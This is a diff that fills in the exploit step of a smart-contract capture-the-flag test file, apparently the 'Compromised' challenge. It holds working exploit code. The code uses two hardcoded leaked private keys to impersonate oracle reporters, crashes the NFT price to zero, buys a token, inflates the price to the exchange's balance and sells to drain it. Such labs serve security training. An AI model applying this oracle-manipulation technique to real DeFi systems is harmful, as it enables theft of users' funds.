@@ -61,6 +61,46 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const DVNFT_SYMBOL = 'DVNFT';
+
+        const getState = async(header) => {
+            console.log(`================== ${header} ==================`)
+            console.log('Exchange Balance :: ' + ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address)));
+            console.log('Media Price :: ' + ethers.utils.formatEther(await this.oracle.getMedianPrice(DVNFT_SYMBOL)));
+            console.log('Attacker Balance :: ' + ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+        }
+
+        await getState('INITIAL STATE');
+        // Catch data from response -> convert to private key: bytes to string then base64 decode result string 
+        const privateKey1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const privateKey2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+        //Connect wallet with private key
+        const reporter1 = new ethers.Wallet(privateKey1, await ethers.provider);
+        const reporter2 = new ethers.Wallet(privateKey2, await ethers.provider);
+
+        //Set postPrice to 0 before buying
+        await this.oracle.connect(reporter1).postPrice(DVNFT_SYMBOL, 0);
+        await this.oracle.connect(reporter2).postPrice(DVNFT_SYMBOL, 0);
+
+        await getState('SET POST PRICE TO 0');
+        //Buy at 0 price
+        await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther('0.005')});
+        
+        //Update price to all exchange balance
+        await this.oracle.connect(reporter1).postPrice(DVNFT_SYMBOL, EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(reporter2).postPrice(DVNFT_SYMBOL, EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await getState('SET POST PRICE TO EXCGANGE BALANCE');
+        // Sell to get whole exchange balance
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await getState('SET POST PRICE TO EXCGANGE BALANCE');
+        // Set back to initial
+        await this.oracle.connect(reporter1).postPrice(DVNFT_SYMBOL, INITIAL_NFT_PRICE);
+        await this.oracle.connect(reporter2).postPrice(DVNFT_SYMBOL, INITIAL_NFT_PRICE);
+
     });
 
     after(async function () {
